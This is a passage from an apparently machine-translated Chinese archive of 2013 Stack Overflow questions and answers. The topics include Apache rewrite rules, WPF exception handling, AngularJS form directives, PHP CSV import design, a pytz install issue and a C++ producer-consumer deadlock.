RewriteBase /user/
RewriteRule ^(.+) ?channel=$1 [R] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T03:47:22.043

是的，你可以：不要使用`[R]`——这是[一个“外部”重定向](http://httpd.apache.org/docs/current/rewrite/flags.html#flag_r)到指定位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T07:48:05.793

这些规则是您想要的吗：

```
RewriteRule ^user/? /user/?channel=
RewriteRule ^user/([a-z0-9-_]+)/? /user/?channel=$1 
```

以及您正在寻找的 PHP 提示：

```
<?php
echo basename($_SERVER['REQUEST_URI']);
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T05:05:13.750

如果我明白你想要这个

```
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/user/(.*)$ 
RewriteRule ^ - [S=1,L]
RewriteCond %{REQUEST_URI} ^/(.*)$ 
RewriteRule ^ /user/?channel%1 
```

# google-maps-api-3 - 将“点击”监听器添加到谷歌地图街景全景链接？

> ID：15845945
> 
> 赞同：1
> 
> 时间：2013-04-06T01:11:59.133
> 
> 标签：google-maps-api-3

是否可以将“单击”事件侦听器附加到 StreetViewPanorama 链接？

我尝试了这样的事情，但没有奏效：

```
var panorama = new.google.maps.StreetViewPanorama("someDomElement");

panorama.setPano('somePano');

google.maps.event.addListener(panorama.links[0], 'click', function () {
  some code;
}); 
```

我需要这个的原因是要找出 pano 是如何设置的：通过单击链接或通过我的代码/处理程序。

谢谢！

# c# - WPF 未处理的异常处理程序并保留调用堆栈

> ID：15845946
> 
> 赞同：6
> 
> 时间：2013-04-06T01:11:59.620
> 
> 标签：c#, .net, wpf, exception

我有一个 WPF 应用程序，每当我的应用程序遇到未处理的异常以帮助调试时，我都需要编写一个小型转储文件。但是，每次调用异常处理程序时，堆栈都会完全展开到处理程序，并且在转储文件中没有可以使用的有用状态。

II 尝试订阅这两个，并且堆栈都为它们展开：

```
Application.Current.DispatcherUnhandledException
AppDomain.CurrentDomain.UnhandledException 
```

我对控制台应用程序进行了同样的尝试，但堆栈没有展开，所以它肯定与 WPF 相关。异常和处理程序都发生在主线程中。

这里有 2 个代码示例，您可以轻松查看。只需在每个处理程序中设置断点，并在遇到断点时观察调用堆栈。

控制台应用程序：

```
class Program
{
    static void Main(string[] args)
    {
        AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(CurrentDomain_UnhandledException);
        int foo = 5;
        ++foo;
        throw new ApplicationException("blah");
        ++foo;
    }

    static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
    {
        Console.WriteLine("blah");
    }
} 
```

WPF 应用程序：

```
public partial class App : Application
{
    protected override void OnStartup(StartupEventArgs e)
    {
        Application.Current.DispatcherUnhandledException += new System.Windows.Threading.DispatcherUnhandledExceptionEventHandler(Current_DispatcherUnhandledException);
        AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(CurrentDomain_UnhandledException);
        int foo = 5;
        ++foo;
        throw new ApplicationException("blah");
        ++foo;
        base.OnStartup(e);
    }

    void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e) {}

    void Current_DispatcherUnhandledException(object sender, System.Windows.Threading.DispatcherUnhandledExceptionEventArgs e)
    {
        e.Handled = false;
    }
} 
```

# iphone - AFJsonRequestOperaton - 如何取消？

> ID：15845947
> 
> 赞同：0
> 
> 时间：2013-04-06T01:12:08.703
> 
> 标签：iphone, ios, objective-c, afnetworking, nsoperation

我有兴趣实现[这里](https://github.com/AFNetworking/AFNetworking/issues/405)推荐的模式。我正在考虑创建 a`NSMutableSet`并将我`AFJSONRequestOperation`的 s 存储到其中，以便在我的 View Controller 调用时取消这些请求`viewDidDisappear`。

我只是查看了源代码，`AFJSONRequestOperation`发现它没有用于取消类似于`NSOperation`...的操作的公共方法

有什么想法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:22:20.490

`AFJSONRequestOperation`是 的子类`NSOperation`，因此它继承了它的`cancel`方法。

只需调用`cancel`操作即可。

# php - 仅限主题视图的 CakePHP 1.2.x 警告

> ID：15845953
> 
> 赞同：0
> 
> 时间：2013-04-06T01:12:34.347
> 
> 标签：php, cakephp, warnings, cakephp-1.2

当我在基于 CakePHP 1.2.10 的应用程序中使用**主题视图时，它会出现以下症状：**

1.  favicon 不会在源中打印出来。
2.  生成以下警告：

    警告 (2)：array_merge() [function.array-merge]：参数 #2 不是数组 [ROOT\cakephp\cake\libs\router.php，第 754 行]

    警告 (2)：extract() 期望参数 1 为数组，给定 null [ROOT\cakephp\cake\libs\router.php，第 754 行]

    注意（8）：未定义变量：escape [ROOT\cakephp\cake\libs\router.php，第 930 行]

所有这些警告和通知都提到：

**[主要] - APP\webroot\index.php，第 87 行**

该文件的第 87 行在以下代码中

```
if (isset($_GET['url']) && $_GET['url'] === 'favicon.ico') {
        return;
    } else {
        $Dispatcher = new Dispatcher(); 
        $Dispatcher->dispatch($url);//This is line 87
    }
    if (Configure::read() > 0) {
        echo "<!-- " . round(getMicrotime() - $TIME_START, 4) . "s -->";
    }
//Here is the end of the file APP\webroot\index.php
?> 
```

我的应用程序包含应用程序目录中的 CakePHP 库。即我所有应用程序的一个蛋糕。

当我切换到非主题视图时，所有这些警告都消失了。我想知道为什么我会收到这些警告？以及我该如何解决它们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T02:28:01.787

我发现这个错误是由于对 $html->url() 方法的错误调用造成的。我被称为 $this->url('/img/logo.png', "full")，但它应该是 $html->url('/img/logo.png', true)。

该调用来自一个名为 head.ctp 的元素文件。以下是完整的比赛警告说明：

```
array_merge - [internal], line ??
Router::url() - ROOT\cakephp\cake\libs\router.php, line 754
Helper::url() - ROOT\cakephp\cake\libs\view\helper.php, line 177
include - APP\views\themed\slate\elements\head.ctp, line 15 //HERE IS THE Mistaken Call
View::_render() - ROOT\cakephp\cake\libs\view\view.php, line 665
View::element() - ROOT\cakephp\cake\libs\view\view.php, line 342
include - APP\views\themed\slate\layouts\blog.ctp, line 1
View::_render() - ROOT\cakephp\cake\libs\view\view.php, line 665
View::renderLayout() - ROOT\cakephp\cake\libs\view\view.php, line 453
View::render() - ROOT\cakephp\cake\libs\view\view.php, line 387
Controller::render() - ROOT\cakephp\cake\libs\controller\controller.php, line 808
Dispatcher::_invoke() - ROOT\cakephp\cake\dispatcher.php, line 229
Dispatcher::dispatch() - ROOT\cakephp\cake\dispatcher.php, line 193
[main] - APP\webroot\index.php, line 88
Warning (2): extract() expects parameter 1 to be array, null given [ROOT\cakephp\cake\libs\router.php, line 754]
Notice (8): Undefined variable: escape [ROOT\cakephp\cake\libs\router.php, line 930 
```

# angularjs - 在 AngularJS 中重用表单片段

> ID：15845957
> 
> 赞同：3
> 
> 时间：2013-04-06T01:12:59.640
> 
> 标签：angularjs

创建少量 HTML 表单元素并在表单中多次将其作为片段重用但使用不同模型的最佳方法是什么？

例如，输入名字、姓氏、街道地址、城市、州、学生的邮政编码、父母、pointOfContact

如果我对模型和输入进行硬编码，我会得到类似的东西：

```
<input name="student.firstName" ng-model="student.firstName" >
<input name="student.lastName" ng-model="student.lastName" >
<input name="parent.firstName" ng-model="parent.firstName" >
<input name="parent.lastName" ng-model="parent.lastName" >
<input name="pointOfContact.firstName" ng-model="pointOfContact.firstName" >
<input name="pointOfContact.lastName" ng-model="pointOfContact.lastName" > 
```

作为一个 angularJs 菜鸟，我不知道该怎么做 $modelPrefix.firstName

**模板 ？**

```
<input name="$modelPrefix.firstName" ng-model="$modelPrefix.firstName" >
<input name="$modelPrefix.lastName" ng-model="$modelPrefix.lastName" > 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-11-18T23:16:44.413

这是一个如何使用指令重用一组表单字段的示例。

首先创建一个包含公共字段的 html 模板文件（address.html）：

```
<div>
  <label for="line1-id">Address</label>
  <input id="line1-id" name="line1" type="text" ng-model="address.line1" required ng-maxlength="255" />
</div>
<div>
  <label for="city-id">City</label>
  <input id="city-id" name="city" type="text" ng-model="address.city" required ng-maxlength="255" />
</div>
<div>
  <label for="state-id">State</label>
  <input id="state-id" name="state" type="text" ng-model="address.state" required ng-maxlength="255" />
</div>
<div>
  <label for="postalCode-id">Postal code</label>
  <input id="postalCode-id" name="postalCode" type="text" ng-model="address.postalCode" required size="5" ng-maxlength="5" ng-minLength="5"/>
</div> 
```

然后创建一个引用此模板 (address.js) 的指令：

```
(function() { 'use strict';

  angular.module('myModule').directive('myAddress', address);

  function address() {
    var directive = {
      scope: {
        form: '=form',
        address: '=address'
      },
      restrict: 'E',
      templateUrl: 'address.html'
    };

    return directive;
  }

}()); 
```

然后你可以在你的表单中使用这个指令：

```
<form name="ctrl.myForm" ng-submit="ctrl.save()">
  <!-- other form fields -->
  <my-address form="ctrl.myForm" address="ctrl.employee.address"></my-address>
</form> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T01:31:56.347

将每个可重用的 HTML 组件包装在 Angular 指令中。这将允许您重用 HTML，同时仍将不同的模型传递给每个模型。

这种技术（和其他技术）将在[http://egghead.io/](http://egghead.io/)上发布的视频中进行解释。 为了您的目的，请密切关注视频 10、11、14 和 15。

# c - 更改位值如何影响地址

> ID：15845964
> 
> 赞同：0
> 
> 时间：2013-04-06T01:14:02.063
> 
> 标签：c, pointers, bit

例如，如果地址`uint8_t *p`是`00000400`，将`(uint32_t*)(p)`保留`0x00000400`（以十六进制表示）。也很`p + 4`简单，`0x00000404`因为`p`它只是一个 8 位 int 指针？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:59:58.830

是的，您可以将指向 uint8_t 的指针转换为 uint32_t。取消引用它可能不是最理想的，但它会起作用。如果您使用的是小端机器，那么这样做的结果可能会让您大吃一惊。

`pointer_to_type_t + n`将永远是`&pointer_to_type_t[n]`或另一种说法：`(type_t*)((uint32|uint64)(pointer_to_type_t) + n * sizeof(type_t))`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T01:22:56.493

在您可能实际使用的平台上，是的。

# python - 我可以引用同一个 Django 模型中的字段吗？

> ID：15845971
> 
> 赞同：0
> 
> 时间：2013-04-06T01:15:16.027
> 
> 标签：python, django

我正在尝试设计一些 Django 模型，但官方文档和 Stack Overflow 都没有给出答案。

问题在于学生模型：一个学生有一个英文名字和一个非英文名字（例如中文）。然而，他们通常更喜欢被称为一个或另一个，而且他们的父母称他们为一个或另一个（有时父母有不同的偏好:)

我想将此首选项存储在学生模型中。现在，我正在存储一个文本值，该值指示学生和家长的首选名称：

```
class Student(models.Model):
    ENGLISH_NAME = 'E'
    OTHER_NAME = 'O'

    PREFERRED_NAME_CHOICES = (
        (ENGLISH_NAME, 'English Name'),
        (OTHER_NAME, 'Other Name (any language)'),
    )
    PREFERRED_NAME_FIELDS = {
        ENGLISH_NAME: 'first_name_english',
        OTHER_NAME: 'first_name_other',
    }

    first_name_english = models.CharField(max_length=50)
    first_name_other = models.CharField(max_length=50)
    child_preferred_name = models.CharField(max_length=1, choices=PREFERRED_NAME_CHOICES)
    parent_preferred_name = models.CharField(max_length=1, choices=PREFERRED_NAME_CHOICES) 
```

我认为这很丑陋。除了在数据库中存储一些值之外，是否有更好的方法来引用同一模型中的字段？

谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T02:34:44.463

这几乎是最好的！

您可以在此处进行的改进是使用`BooleanField`s，因为您只存储一个标志，而不是实际上比一位大得多的 1 字符文本值。

# php - 关注点分离和依赖注入

> ID：15845972
> 
> 赞同：1
> 
> 时间：2013-04-06T01:15:42.923
> 
> 标签：php, oop, class, dependencies, code-injection

基于在 stackoverflow 上得到的一些好的建议，我需要更多的指导。有人告诉我，关注点分离对于保持代码整洁和模块化很重要，我发现确实如此。

我的问题是：根据我对 SOC 的了解，我开发了 2 个类。供应商类和 CSV 类。供应商仅从数据库中检索有关我的不同供应商的数据。Csv 类从正在导入的 csv 文件中检索数据，我需要解析它的所有信息，最终目标是将数据插入到我的供应商表中。为了实现将 csv 数据插入数据库的目标，我需要使用这两个类中的方法。我是否创建了一个名为 ImportSuppliersCsv 之类的第三类，还是将导入函数创建为 Suppliers 类的方法更有意义？

缩短以节省空间，我的课程是这样的：

```
class Suppliers
{

    public $db;
    public $inv;
    public $table;

    public function __construct (PDO $db)
    {

        $this->db = $db;
        $this->inv = 'lightsnh_inventory';
        $this->table = 'suppliers';

    }

    public function getSuppliers() 
    {               

        $sql = 'SELECT * FROM `'.$this->inv.'`.`'.$this->table.'`';
        $statement = $this->db->query($sql);
        $result = $statement->fetchAll(PDO::FETCH_ASSOC);

        return $result;

    }

    public function getActiveSuppliers() 
    {               

        $suppliers = $this->getSuppliers();     
        $active = array();      
        foreach($suppliers as $supplier) {

            if($supplier['exclude'] == 0)           
                    $active[] = $supplier;

        }

        return $active;

    }

    public function getDistributors() 
    {               

        $suppliers = $this->getSuppliers();     
        $distributors = array();        
        foreach($suppliers as $supplier) {

            if($supplier['type'] == 1)          
                    $distributors[] = $supplier;

        }

        return $distributors;

    }

    class Csv
    {

        public $form;

        public function __construct($form_name)
        {

            $this->form = $form_name;

        }

        public function getFile()
        {

            if(isset($_POST[$this->form.'-upload-submit'])) {

                return $_FILES[$this->form.'-file'];

            }

        }

        public function getName()
        {

            $file = $this->getFile();
            return $file['name'];

        }

        public function getExtension()
        {

            return end(explode('.',$this->getName()));

        }

        public function getType()
        {

            $file = $this->getFile();
            return $file['type'];

        }   etc..... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-15T02:42:17.443

两者都不。OOP/SoC/DI 等不是目的，它们是一种手段。SoC 的目的是使维护更容易的模块化架构，尽管分离关注点总是通过模糊问题来扩大问题。我发现在 PHP 中提出一个好的设计的最好方法是首先让它工作，然后重构。您也可以先在您的想象中执行此操作以节省一些时间。以您认为最好的方式组织它。毕竟，这个想法是为了让要维护代码的人能够轻松找到自己的方式，因为他们是以这种方式组织代码的。简而言之，谨防过度设计。

在你的例子中，如果它只在一个地方使用，我不会费心去做一类东西。举个例子：通常一个可以将 CSV 记录导入数据库的应用程序，也有一个表单来编辑这些行，所以我假设 Suppliers 类中有一个“保存”功能，因为它已经抽象了查询（糟糕- 没有缓存、没有 WHERE 子句、SQL 注入等）。现在导入 CSV 文件的问题是将数据有序地呈现给这个“保存”功能的问题。

现在，将 CSV 文件导入数据库的基本代码本身就是这样简单：

```
$data = array_map( 'str_getcsv', explode("\n", file_get_contents( $filename ) ) );
$columns = array_shift( $data );
$sth = $db->prepareStatement( "INSERT INTO suppliers( " . implode( ',', $columns )
  . ") VALUES ( " . substr(str_repeat(",?",count($columns)),1) . ")"
);
foreach ( $data as $line )
  $sth->execute( $line ); 
```

通常它不是那么理想——但这本质上是核心功能。它只有 4 个语句，四个关注点：解析 CSV、映射字段、更新数据库和效率/一致性（使用准备好的语句）。

OOP 仍然依赖于函数式编程——按功能组织。以上内容可以保留为脚本，由 cron 作业或网页调用。它可以放在函数“import_csv”中，供这些任务重用。但是把它放在一个班级里是矫枉过正的。SoC 还使用外观或接口。函数就是这样，如果需要，可以很容易地分组到一个类中。您只需要一个函数 import_csv( $filename, $profile )。$profile 将指示表（或表）、列映射等。通过将它们分开，您可以制作通用的 CSV 到 DB 映射编辑器 - 或者至少支持仅通过更改配置将任何 CSV 文件导入任何表。如果您对所有内容进行分类，您最终将为您必须导入的每个 CSV 文件编写一个类。

想象一下，不管数据如何，都是一个通用的导入器。专注于功能，因为这就是代码。这是一种更好的方法，因为您的代码将不依赖于数据库结构 - 您已经抽象了它（通过使用公共接口扩展 Table 基类，以便您可以 $table->save()）。您不会抽象 CSV（这是不值得的，如第一行代码所示），而是映射。

这不是您期望的答案，但我确定您不希望答案是您给出的答案，因为您将其作为问题提出。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-09T07:14:15.423

您不需要新类即可从 CSV 插入新供应商。您可以简单地添加一个新方法并将一个 Csv 对象传递给它。这样，所有与供应商相关的活动都将封装在一个类中。

或者，如果您打算拥有其他信息源，除了 CSV，您可以让供应商方法接受解析的信息，而不是 CSV 对象。

# php - 我将如何编写这个 PHP 代码来更好地调用 WordPress 中的类别帖子？

> ID：15845973
> 
> 赞同：0
> 
> 时间：2013-04-06T01:15:48.580
> 
> 标签：php, wordpress

我是 PHP 新手，我尝试编写调用某个类别中最近帖子的调用，但似乎我进入了回显循环。

我将如何优化以下代码，使其看起来不像它那样？

```
<?php $cat_id = 3;
$latest_cat_post = new WP_Query( array('posts_per_page' => 1, 'category__in' => array($cat_id)));
if( $latest_cat_post->have_posts() ) : while( $latest_cat_post->have_posts() ) : $latest_cat_post->the_post();
echo '<a href="';
the_permalink();
echo '">';
if ( has_post_thumbnail() ) {
the_post_thumbnail();
}
echo '</a>';
echo '<div class="widget-box-text">'
echo '<a href="';
the_permalink();
echo '">';
the_title();
echo '</a>';
the_excerpt();
echo '</div><!-- widget-box-text -->'
endwhile; endif; ?> 
```

非常感谢，我期待学习编程，并希望我的代码至少符合这种规范。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T01:27:55.583

您只需要正确格式化和缩进该代码并使用 PHP 模板而不是`echo`：

```
<?php
$cat_id = 3;
$query = new WP_Query(array(
  'posts_per_page' => 1,
  'category__in' => $cat_id
));
?>

<?php while ($query->have_posts()): $query->the_post(); ?>
  <a href="<?php the_permalink(); ?>"></a>
  <?php if (has_post_thumbnail()) the_post_thumbnail(); ?>
  <div class="widget-box-text">
    <a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
    <?php the_excerpt(); ?>
  </div>
<?php endwhile; ?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T02:27:21.583

如果您不想在 PHP 和 HTML 之间交替使用，您可以坚持使用 PHP。这只是编写相同内容的另一种方式。

```
<?php

$cat_id = 3;
$query = new WP_Query
(
    array
    (
        'posts_per_page' => 1,
        'category__in' => $cat_id
    )
);

while($query->have_posts())
{
    $query->the_post();

    echo  '<a href="'.the_permalink().'"></a>';

    if (has_post_thumbnail()){
        the_post_thumbnail();
    }

    echo  '<div class="widget-box-text">'
                .'<a href="'.the_permalink().'">'.the_title().'</a>';

    the_excerpt();

    echo '</div>';
}

?> 
```

# actionscript-3 - AS3将大数转换为base16数

> ID：15845975
> 
> 赞同：1
> 
> 时间：2013-04-06T01:16:03.780
> 
> 标签：actionscript-3, hex, type-conversion

我试图取一个字符串，把它变成一个数字，把那个数字变成base16，然后把它变成一个字符串。

这是我到目前为止所拥有的：

```
var d:String = convertBase("123487032174829820348320429437483266812812");

function convertBase(inputInBase10:String):String
{
    var i = Number(inputInBase10);
    var u = i.toString(16);
    trace("i = " + i);
    trace("u = " + u);
    return dest;
} 
```

这是打印的内容：

```
i = 1.23487032174829e+41
u = 16ae5514d07e12000000000000000000000 
```

我一直在努力`u`填写。我知道这是一个更大的数字。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T03:04:25.170

Number as IEEE-754 double-precision floating-point 不具有精确表示您的值的精度；但是，大约接近。

有[BigInteger](https://code.google.com/p/as3crypto/source/browse/trunk/as3crypto/src/com/hurlant/math/BigInteger.as)实现，例如[as3crypto](https://code.google.com/p/as3crypto/)，以及其他支持任意长度的实现。

检查 as3crypto 的 BigInteger`toRadix()`和`fromRadix()`方法产生：

```
 decimal: 123487032174829820348320429437483266812812
hexadecimal: 16ae5514d07e120126dfbcb3073fddb2b8c 
```

例子：

```
import com.hurlant.math.BigInteger;

var n:BigInteger = new BigInteger();

n.fromRadix("123487032174829820348320429437483266812812", 10);
trace(n.toRadix(16));
trace(n.toRadix(10)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T11:48:27.103

请注意，这不是最有效的解决方案，但可行，因为您的数字不会很长（很长意味着数千个小数位）。下面的算法实现了长除法，使用字符串记录长数，然后将前一次除法的结果反复除以 16，同时将余数记录到结果中。这为您提供了问题的解决方案。

下面的代码是用 JavaScript 编写的（对不起，我在这台机器上没有 AS 编译器），但是通过添加正确的类型标签让它看起来更像 AS 一定很简单：

```
var source = "123487032174829820348320429437483266812812";

function longDivision(divident, quotient) {
    var i, digits = [], dividentPart = 0, resultDigits = [], nextDigit;
    for (i = 0; i < divident.length; i++) {
        digits[i] = parseInt(divident[i], 10);
    }
    i = 0;
    do {
        dividentPart = dividentPart * 10 + digits[i];
        if (dividentPart >= quotient) {
            nextDigit = (dividentPart / quotient) | 0;
            resultDigits.push(nextDigit);
            dividentPart = dividentPart - nextDigit * quotient;
        } else if (resultDigits.length) {
            resultDigits.push(0);
        }
        i++;
    } while (i < digits.length);
    return { a: resultDigits.join(""), b: dividentPart };
}

function decimalToHex(input) {
    var result = "", div;
    do {
        div = longDivision(input, 16);
        result = div.b.toString(16) + result;
        input = div.a;
    } while (input);
    if (!result) result = "0";
    return "0x" + result;
}

decimalToHex(source);
// '0x16ae5514d07e120126dfbcb3073fddb2b8c' 
```

# python - python: pytz 包安装问题：ImportError: No module named pytz

> ID：15845983
> 
> 赞同：0
> 
> 时间：2013-04-06T01:17:51.730
> 
> 标签：python, installation, importerror, pytz

我通过以下方式在我的 windows7 机器上安装了 pytz 包：

```
C:\Users\name\Downloads\pytz>easy_install --upgrade pytz
Searching for pytz
Reading http://pypi.python.org/simple/pytz/
Reading http://pytz.sourceforge.net
Reading http://sourceforge.net/project/showfiles.php?group_id=79122
Reading http://www.stuartbishop.net/Software/pytz
Reading http://sourceforge.net/projects/pytz/
Best match: pytz 2013b
Downloading http://pypi.python.org/packages/2.7/p/pytz/pytz-2013b-py2.7.egg#md5=7cfcc57ddb87125a042b70c03580d6cf
Processing pytz-2013b-py2.7.egg
Moving pytz-2013b-py2.7.egg to c:\python27\lib\site-packages
Adding pytz 2013b to easy-install.pth file

Installed c:\python27\lib\site-packages\pytz-2013b-py2.7.egg
Processing dependencies for pytz
Finished processing dependencies for pytz

C:\Python27\Lib\site-packages>dir
 Volume in drive C has no label.
 Volume Serial Number is 485C-3867 
```

我检查了 .egg 文件是否在 python27\lib\site-packages 目录中：

```
 Directory of C:\Python27\Lib\site-packages

04/05/2013  06:06 PM    <DIR>          .
04/05/2013  06:06 PM    <DIR>          ..
04/05/2013  06:06 PM               237 easy-install.pth
09/20/2006  10:05 AM               126 easy_install.py
04/05/2013  05:33 PM               312 easy_install.pyc
04/05/2013  05:33 PM               312 easy_install.pyo
10/19/2009  06:35 AM            85,435 pkg_resources.py
04/05/2013  05:33 PM            90,779 pkg_resources.pyc
04/05/2013  05:33 PM            90,779 pkg_resources.pyo
04/05/2013  06:06 PM           521,259 pytz-2013b-py2.7.egg
03/08/2011  10:39 AM               121 README.txt
04/05/2013  05:33 PM    <DIR>          setuptools
04/05/2013  05:33 PM    <DIR>          setuptools-0.6c11-py2.7.egg-info
09/20/2006  10:05 AM             2,362 site.py
04/05/2013  05:33 PM             1,719 site.pyc
04/05/2013  05:33 PM             1,719 site.pyo
04/05/2013  05:36 PM         1,784,796 sqlalchemy-0.8.0-py2.7.egg
04/05/2013  05:27 PM    <DIR>          xlrd
04/05/2013  05:27 PM               975 xlrd-0.7.3-py2.7.egg-info 
```

但是当我去 python 解释器时，我得到：

```
>>>import pytz
Traceback (most recent call last):
  File "<console>", line 1, in <module>
ImportError: No module named pytz 
```

当我在 PyDev 中打开一个 .py 文件时，它声称该`import pytz`语句未解决。它找不到包裹。

我会很感激一些帮助。谢谢你。

**编辑 **

的内容`easy_install.pth`：

```
import sys; sys.__plen = len(sys.path)
./sqlalchemy-0.8.0-py2.7.egg
./pytz-2013b-py2.7.egg
import sys; new=sys.path[sys.__plen:]; del sys.path[sys.__plen:]; p=getattr(sys,'__egginsert',0); sys.path[p:p]=new; sys.__egginsert = p+len(new) 
```

我`./pytz-2013b-py2.7.egg`从`easy_install.pth`文件中删除了 并尝试了`easy_install pytz`. 这次它安装了，我可以`import pytz`没有之前报告的错误（为什么会解决这个问题？）。

但是，我的 ecplise/pydev 似乎仍然不承认该`import pytz`声明。它无法解决它。它也无法解析`import sqlalchemy`，但 dos python 解释器可以同时导入两者。`C:\Python27\python.exe`如果您转到`Windows > Preferences > Interpreter - Python`.

有趣的是，我不得不检查*项目*中的解释器配置。我只是假设项目会知道给定全局设置。但我想不会。

现在一切正常。非常感谢大家。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T16:15:04.820

一些想法：

1.  检查你的鸡蛋没有设置任何时髦的权限。
2.  那是你唯一用 C 语言安装的 Python 吗？`import sys; sys.executable`检查哪个正在运行。
3.  您还有其他可以进口的鸡蛋*吗*？

# pagespeed - 改进 Google PageSpeed Insight 上的服务器响应时间。这是新的吗？

> ID：15845984
> 
> 赞同：5
> 
> 时间：2013-04-06T01:18:58.797
> 
> 标签：pagespeed, google-pagespeed

我已经为客户建立了一个模板和一些网站。我总是担心网站加载时间。我的 Google PageSpeed Insights 是我的主要工具之一。两天前，我提到了一些不同的东西。我发现我的许多网站页面加载都是下降的。而影响该更改的 PageSpeed 规则是“**提高服务器响应时间**”。我以前从未见过这个规则。

我询问我的托管服务是否有任何服务器问题，他使用 GTmetrix 进行检查。他说没关系，他没有发现任何重大问题。我自己检查了一下，发现该网站的 Google PageSpeed Insights 是**不同**的。

请看一下，

*   这是 pagespeed 洞察力测试结果[http://imm.io/123Ex](http://imm.io/123Ex)
*   这是 GTMetrix 测试结果[http://imm.io/123EV](http://imm.io/123EV)

**“提高服务器响应时间”**是新规则吗？如果是，我该怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-29T18:26:41.440

谷歌刚刚宣布了一项您可以使用的“PageSpeed”服务（[https://developers.google.com/speed/pagespeed/service](https://developers.google.com/speed/pagespeed/service)），您基本上可以在他们的服务器上托管您的网站。

使用它会永远修复他们查看您的页面速度的问题，因为他们会从自己的服务器上查看它。虽然谁知道它是否比其他 CDN 网络更快......

我相信它会大大加快您的内容的服务速度，因为谷歌致力于让互联网更快。

# google-drive-api - google Drive maxResults 查询

> ID：15845986
> 
> 赞同：5
> 
> 时间：2013-04-06T01:19:17.593
> 
> 标签：google-drive-api

当获取文件夹列表（/文件的 aq 参数为：mimeType='application/vnd.google-apps.folder'）时，nextLink 包括我已包括的任何 maxResults 参数，但不包括 q 参数，所以当跟随nextLink，非文件夹包含在结果中。如果我尝试将 q 参数添加到 nextLink，我会收到 500 错误。

如何最有效地获取完整的文件夹列表？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-11-23T08:11:00.000

当一个错误被提出并且已知时，它应该作为结束讨论的答案

# c++ - 并发双向链表 - 多个生产者/消费者 FIFO 队列 - 死锁

> ID：15845988
> 
> 赞同：1
> 
> 时间：2013-04-06T01:20:30.780
> 
> 标签：c++, deadlock, producer-consumer, doubly-linked-list

我在玩 MPMC FIFO 队列的双向链表（主要用于演示目的）。我现在的目标是暂时确定我的错误，但我并没有真正取得进展。

在所有 Producer-Threads 产生了所有值之后不久，我遇到了死锁。我将问题归结为以下几点：

锁定获取：

```
<THREAD ID> | <MESSAGE> | <MUTEX ADDRESS>

4460175360 : TRYLOCK HEAD:   0x7fb380c039d0
4460175360 : LOCKED HEAD:     0x7fb380c039d0
4460175360 : RELEASED HEAD: 0x7fb380c039d0

4460175360 : TRYLOCK HEAD:    0x7fb380c039d0
4460175360 : LOCKED HEAD:      0x7fb380c039d0
4460175360 : RELEASED HEAD:  0x7fb380c039d0

4460175360 : TRYLOCK HEAD:    0x7fb380c039d0
4460175360 : LOCKED HEAD:      0x7fb380c039d0
4460175360 : RELEASED HEAD:  0x7fb380c039d0

4460175360 : TRYLOCK HEAD:    0x7fb380c039d0
4459638784 : TRYLOCK TAIL:       0x7fb380c039d0
4460711936 : TRYLOCK TAIL:       0x7fb380c039d0
4460175360 : LOCKED HEAD:      0x7fb380c039d0
4460175360 : RELEASED HEAD:  0x7fb380c039d0

4460175360 : TRYLOCK HEAD: 0x7fb380c039d0   <---- THIS TRY-LOCK-HEAD NEVER GETS CONFIRMED!
4459638784 : LOCKED TAIL:  0x7fb380c039d0 
4459638784 : RELEASE MUTEX: 0x7fb380c039d0 <---- THE PRODUCER THREAD RELEASED 0x7fb380c039d0
Producer-Thread 4459638784 produced: 0

---- NOW ONE ELEMENT IN QUEUE ----

4460711936 : LOCKED TAIL:  0x7fb381800020 <---- ADDRESS OF LOCK HAS CHANGED WHICH IS FINE (because an element has been added)
4460711936 : RELEASE MUTEX AT ADDR: 0x7fb381800020
Producer-Thread 4460711936 produced: 0

---- NOW TWO ELEMENTS IN QUEUE ----

4460711936 : TRYLOCK TAIL: 0x7fb381a00020
4459638784 : TRYLOCK TAIL: 0x7fb381a00020
4460711936 : LOCKED TAIL:   0x7fb381a00020
4460711936 : RELEASE MUTEX AT ADDR: 0x7fb381a00020
Producer-Thread 4460711936 produced: 1

---- NOW THREE ELEMENTS IN QUEUE ----

4459638784 : LOCKED TAIL: 0x7fb380d00060  <---- AGAIN ADDRESS HAS CHANGED -- FINE
4459638784 : RELEASE MUTEX AT ADDR: 0x7fb380d00060
Producer-Thread 4459638784 produced: 1

---- NOW FOUR ELEMENTS IN QUEUE ---- PRODUCERS ARE DONE ----
---- CONSUMER THREAD BLOCKS - STILL TRYING TO LOCK 0x7fb380c039d0 ----

---- BUT NOBODY ELSE HOLDS 0x7fb380c039d0 ---- ALSO NO SELF-DEADLOCK? 
```

GDB 告诉我两个生产者线程都已终止，唯一在 addr 0x7fb380c039d0 处等待互斥的线程是线程 2（唯一的消费者线程）：

```
 (gdb) info threads
* 2                         0x00007fff8edc5dfd in pthread_mutex_lock ()
  1 "com.apple.main-thread" 0x00007fff8e715386 in __semwait_signal ()
